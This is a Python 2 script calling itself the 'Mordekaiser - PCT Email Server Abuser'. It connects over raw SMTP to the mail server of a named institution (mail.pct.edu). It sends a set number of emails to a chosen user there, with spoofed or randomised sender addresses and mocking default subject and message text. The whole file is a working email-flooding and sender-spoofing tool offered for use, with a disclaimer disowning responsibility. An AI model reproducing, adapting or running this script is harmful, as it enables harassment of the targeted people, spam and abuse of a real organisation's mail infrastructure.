#!/usr/bin/env python
import time
import sys
import telnetlib
import optparse
from optparse import SUPPRESS_HELP
import random, string

parser=optparse.OptionParser("Usage: %prog -t TARGET")
def about(option,opt,value,parser):
	print "Mordekaiser - PCT Email Server Abuser\n@Schr0Sec\nI accept NO RESPONSIBILITY for the use of this tool. Please follow your TOS and EULA. I offer no warranty of any kind. Using this tool may crash, root, bot, 0wn, or in any number of other ways violate your warranties and TOS."
	exit()
 
parser.add_option("-t","--target",dest="target",type="string",help="Target to send emails to") 
parser.add_option("-n","--number",dest="number",default=5,type="int",help="How many emails to send") 
parser.add_option("-a","--about",action="callback",callback=about,help=SUPPRESS_HELP) 
parser.add_option("-m","--message",dest="message",type="string",default="BR?",help="Message to send in email") 
parser.add_option("-s","--subject",dest="subject",type="string",default="HUEHUEHUEHUEHUEHUEHUEHUEHUEHUEHUE",help="Subject to use for email") 
parser.add_option("-r","--randomuser",action="store_true",dest="randomize",default=False) 
parser.add_option("-u","--user",dest="user",type="string",default="mordekaiser",help="User to send emails from") 
parser.add_option("-d","--delay",dest="delay",type="float",help="Time to wait for SMTP to respond, adjust accordingly [0.1]",default=0.1) 
parser.add_option("-w","--where",dest="where",type="string",help="--server accepts this, but it never arrives-- Set sender domain addr",default="pct.edu")
(options, args)=parser.parse_args() 
if not options.target:
	parser.error("Please specify a target!")

def randomword(length):
	return ''.join(random.choice(string.lowercase) for i in range (length))
HOST="mail.pct.edu" 
PORT="25"
sDOMAIN="mordekaiser.pct.edu"
MSG=options.message
SUB=options.subject
TARGET=options.target+"@pct.edu"
SLEEP=0.1 #adjust this until it produces reliable output, based on time to server
LOOP=options.number

for x in range(0, LOOP):
	
	if options.randomize:
		FROM=randomword(3)+"@"+options.where
	else:
		FROM=options.user+"@"+options.where
	tn=telnetlib.Telnet(HOST,PORT)
	time.sleep(SLEEP)
	tn.read_eager()
	tn.read_eager()
	tn.write("HELO "+HOST+"\r\n")
	time.sleep(SLEEP)
	tn.read_eager()  
	tn.write("MAIL FROM: "+FROM+"\r\n")
	time.sleep(SLEEP) 
	tn.read_eager()
	tn.write("RCPT TO: "+TARGET+"\r\n")
	time.sleep(SLEEP) 
	tn.read_eager()
	tn.write("DATA\r\n")
	time.sleep(SLEEP) 
	tn.read_eager() 
	tn.write("Subject: "+SUB+"\r\n\r\n"+MSG+"\r\n"+".\r\n")
	time.sleep(SLEEP)
	tn.read_eager()
	tn.close()
	print "Sent {0} emails...".format(x+1)
print("---Completed!---")
